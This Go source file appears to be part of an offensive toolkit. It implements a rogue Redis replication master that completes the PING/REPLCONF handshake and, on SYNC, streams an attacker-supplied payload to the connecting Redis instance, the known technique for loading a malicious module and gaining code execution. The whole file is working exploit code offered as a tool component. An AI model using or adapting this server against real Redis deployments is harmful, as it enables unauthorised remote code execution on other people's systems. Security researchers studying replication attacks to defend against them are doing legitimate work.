package redis

import (
	"davinci/common/log"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

type rogueServer struct {
	port    int
	listen  net.Listener
	payload []byte
}

func CreateRogueserver(port int, payload []byte) *rogueServer {
	listen, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		log.Warn("(local) bind port error")
		log.Error(err)
		return nil
	}
	log.Info(fmt.Sprintf("(local) start listening %d", port))
	return &rogueServer{
		port:    port,
		listen:  listen,
		payload: payload,
	}
}

func (r *rogueServer) Handle(done chan struct{}) {
	conn, err := r.listen.Accept()
	defer conn.Close()
	if err != nil {
		log.Warn("(local) accept connect error")
		log.Error(err)
		return
	}
	log.Info("(local) get connection: ", conn.RemoteAddr())
	buf := make([]byte, 1024)
	for {
		//buf, err := ioutil.ReadAll(conn)
		cnt, err := conn.Read(buf)
		if err != nil {
			log.Error(conn.RemoteAddr().String(), " connection error: ", err)
			return
		}
		data := string(buf[:cnt])
		if strings.Contains(data, "PING") {
			conn.Write([]byte("+PONG\r\n"))
			log.Info("->receive: PING")
			log.Info("<-send   : PONG")
			continue
		} else if strings.Contains(data, "REPLCONF") {
			conn.Write([]byte("+OK\r\n"))
			log.Info("->receive: REPLCONF")
			log.Info("<-send   : OK")
			continue
		} else if strings.Contains(data, "SYNC") {
			resp := "+FULLRESYNC " + strings.Repeat("Z", 40) + " 0" + "\r\n"
			resp += "$" + strconv.Itoa(len(r.payload)) + "\r\n"
			payload := append([]byte(resp), r.payload...)
			payload = append(payload, []byte("\r\n")...)
			conn.Write(payload)
			log.Info("->receive: " + strings.Trim(data, "\n"))
			log.Info("<-send   : {payload}")
			time.Sleep(2 * time.Second)
			close(done)
			return
		} else {
			log.Warn("[warn] unknow action", data)
		}
	}

}
